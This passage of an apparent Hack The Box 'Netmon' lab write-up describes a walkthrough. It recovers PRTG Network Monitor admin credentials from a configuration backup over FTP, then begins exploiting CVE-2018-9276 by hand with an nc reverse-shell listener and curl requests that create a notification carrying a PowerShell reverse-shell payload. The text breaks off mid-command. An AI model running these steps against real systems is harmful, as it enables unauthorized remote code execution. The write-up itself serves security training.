+<p>If we search online for PRTG Network Monitor's default credentials, we find a
+<a href="https://www.paessler.com/manuals/prtg/login">manual page</a> from
+<a href="https://www.paessler.com/">Paessler</a> (the vendor) mentioning that it's
+<code>prtgadmin</code>:<code>prtgadmin</code>.</p>
+<p>Unfortunately, they are invalid.</p>
+<p>What about common credentials then? I launched a Cluster bomb attack on Burp
+Suite using
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">this wordlist</a>
+for the usernames and
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt">this wordlist</a>
+for the passwords. Unfortunately, only the first 47 requests were tried, the
+server stopped responding to requests after that. All of the combinations tested
+failed.</p>
+<p>So let's think a bit. We have access to what could be a part of Netmon's
+filesystem through the FTP server. Maybe it holds sensitive information related
+to PRTG Network Monitor?</p>
+<p>If we search online, we find
+<a href="https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data">an article</a>
+by <a href="https://www.paessler.com/">Paessler</a> listing the various storage location
+for PRTG Network Monitor. Apparently, the data directory is
+<code>%programdata%\Paessler\PRTG Network Monitor</code>. It might be worth checking!</p>
+<h3 id="ftp-1">FTP</h3>
+<h4 id="exploring-programdata-paessler-prtg-network-monitor">Exploring <code>\ProgramData\Paessler\PRTG Network Monitor</code></h4>
+<p>Let's list the content of the <code>\ProgramData\Paessler\PRTG Network Monitor</code>
+FTP folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ftp</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> dir <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>\ProgramData\Paessler\PRTG Network Monitor<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">08-18-23  07:20AM       &lt;DIR&gt;          Configuration Auto-Backups
+</span><span class="z-text z-plain">02-04-24  05:39AM       &lt;DIR&gt;          Log Database
+</span><span class="z-text z-plain">02-02-19  11:18PM       &lt;DIR&gt;          Logs (Debug)
+</span><span class="z-text z-plain">02-02-19  11:18PM       &lt;DIR&gt;          Logs (Sensors)
+</span><span class="z-text z-plain">02-02-19  11:18PM       &lt;DIR&gt;          Logs (System)
+</span><span class="z-text z-plain">02-04-24  05:39AM       &lt;DIR&gt;          Logs (Web Server)
+</span><span class="z-text z-plain">01-15-24  10:03AM       &lt;DIR&gt;          Monitoring Database
+</span><span class="z-text z-plain">02-25-19  09:54PM              1189697 PRTG Configuration.dat
+</span><span class="z-text z-plain">02-25-19  09:54PM              1189697 PRTG Configuration.old
+</span><span class="z-text z-plain">07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
+</span><span class="z-text z-plain">01-15-24  10:03AM              1648429 PRTG Graph Data Cache.dat
+</span><span class="z-text z-plain">02-25-19  10:00PM       &lt;DIR&gt;          Report PDFs
+</span><span class="z-text z-plain">02-02-19  11:18PM       &lt;DIR&gt;          System Information Database
+</span><span class="z-text z-plain">02-02-19  11:40PM       &lt;DIR&gt;          Ticket Database
+</span><span class="z-text z-plain">02-02-19  11:18PM       &lt;DIR&gt;          ToDo Database
+</span></code></pre>
+<p>We find a few files.</p>
+<p>If we retrieve <code>PRTG Configuration.old.bak</code> and explore its content, we stumble
+across this:</p>
+<pre data-lang="xml" class="language-xml z-code"><code class="language-xml" data-lang="xml"><span class="z-text z-xml"><span class="z-meta z-tag z-xml"><span class="z-punctuation z-definition z-tag z-begin z-xml">&lt;</span><span class="z-entity z-name z-tag z-localname z-xml">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-xml">&gt;</span></span>
+</span><span class="z-text z-xml"><span class="z-meta z-tag z-xml"><span class="z-punctuation z-definition z-tag z-begin z-xml">&lt;</span><span class="z-entity z-name z-tag z-localname z-xml">dbpassword</span><span class="z-punctuation z-definition z-tag z-end z-xml">&gt;</span></span>
+</span><span class="z-text z-xml">    <span class="z-comment z-block z-xml"><span class="z-punctuation z-definition z-comment z-begin z-xml">&lt;!--</span> User: prtgadmin <span class="z-punctuation z-definition z-comment z-end z-xml">--&gt;</span></span>
+</span><span class="z-text z-xml">    PrTg@dmin2018
+</span><span class="z-text z-xml"><span class="z-meta z-tag z-xml"><span class="z-punctuation z-definition z-tag z-begin z-xml">&lt;/</span><span class="z-entity z-name z-tag z-localname z-xml">dbpassword</span><span class="z-punctuation z-definition z-tag z-end z-xml">&gt;</span></span>
+</span><span class="z-text z-xml"><span class="z-meta z-tag z-xml"><span class="z-punctuation z-definition z-tag z-begin z-xml">&lt;</span><span class="z-entity z-name z-tag z-localname z-xml">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-xml">&gt;</span></span>
+</span></code></pre>
+<p>Credentials! We found them in a backup file dating back to 2018 though, so they
+must be old. But maybe they're still valid?</p>
+<h3 id="prtg-network-monitor-1">PRTG Network Monitor</h3>
+<h4 id="exploration-2">Exploration</h4>
+<p>Back to our login form, we can try the credentials
+<code>prtgadmin</code>:<code>PrTg@dmin2018</code>... but it fails.</p>
+<p>Given that these credentials are from 2018 and the current configuration file
+(<code>PRTG Configuration.dat</code>) is dated 2019, it's possible that the user simply
+updated the year from 2018 to 2019.</p>
+<p>Let's give it a shot.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/netmon/prtg-network-monitor-dashboard-page.png" alt="PRTG Network Monitor dashboard page" /></p>
+<p>The credentials <code>prtgadmin</code>:<code>PrTg@dmin2019</code> worked!</p>
+<p>Now we have access to the app.</p>
+<p>I browsed around a bit, but I found nothing that would grant me RCE.</p>
+<h4 id="known-vulnerabilities-2">Known vulnerabilities</h4>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for
+<code>PRTG Network Monitor</code>, we find
+<a href="https://www.exploit-db.com/exploits/46527">PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</a>
+(<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-9276">CVE-2018-9276</a>).</p>
+<p>Let's give it a try!</p>
+<h2 id="foothold-cve-2018-9276">Foothold (<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-9276">CVE-2018-9276</a>)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-9276">CVE-2018-9276</a> is a
+vulnerability in PRTG Network Monitor prior to version <code>18.2.39</code>. Due to a poor
+validation of the script name, an attacker can create a notification whose
+script name is chained with an OS command to get RCE.</p>
+<h3 id="preparation">Preparation</h3>
+<p>The Metasploit module <code>exploit/windows/http/prtg_authenticated_rce</code> can be used
+to exploit this vulnerability, but it's not too hard to do manually.</p>
+<p>The goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll choose the 'Powershell #3 (Base64)' payload from
+<a href="https://www.revshells.com/">RevShells</a>.</p>
+<p>I'll save it as the <code>REVSHELL_PAYLOAD</code> shell variable.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>In order to create a notification, we need to be authenticated, so we need an
+<code>OCTOPUS1813713946</code> cookie.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> RESPONSE=<span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">curl</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.152/public/checklogin.htm<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>username=prtgadmin<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>password=PrTg@dmin2019<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
+</span></span><span class="z-source z-shell z-bash">  <span class="z-variable z-other z-readwrite z-assignment z-shell">OCTOPUS1813713946</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">RESPONSE</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Set-Cookie: OCTOPUS1813713946=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">awk</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>=<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>{print $2}<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">awk</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>{print $1}<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sed</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>s/;$//<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
+</span></code></pre>
+<p>Now we can create a notification with our payload. We'll save the ID of our notification.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> RESPONSE=<span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">curl</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Cookie: OCTOPUS1813713946=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">OCTOPUS1813713946</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>X-Requested-With: XMLHttpRequest<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.152/editsettings<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> POST<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>name_=Revshell<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>tags_=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>schedule_=-1|None|<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>postpone_=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>comments=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>summode_=2<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>summarysubject_=[%sitename] %summarycount Summarized Notifications<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>summinutes_=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>accessrights_=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>accessrights_=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>accessrights_201=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_1=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>addressuserid_1=-1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>addressgroupid_1=-1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>address_1=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>subject_1=[%sitename] %device %name %status %down (%message)<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>contenttype_1=text/html<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>customtext_1=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>priority_1=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_17=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>addressuserid_17=-1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>addressgroupid_17=-1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>message_17=[%sitename] %device %name %status %down (%message)<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_8=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>addressuserid_8=-1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>addressgroupid_8=-1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>address_8=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>message_8=[%sitename] %device %name %status %down (%message)<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_2=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>eventlogfile_2=application<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>sender_2=PRTG Network Monitor<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>eventtype_2=error<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>message_2=[%sitename] %device %name %status %down (%message)<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_13=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>sysloghost_13=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>syslogport_13=514<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>syslogfacility_13=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>syslogencoding_13=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>message_13=[%sitename] %device %name %status %down (%message)<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_14=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>snmphost_14=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>snmpport_14=162<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>snmpcommunity_14=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>snmptrapspec_14=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>messageid_14=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>message_14=[%sitename] %device %name %status %down (%message)<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>senderip_14=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_9=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> 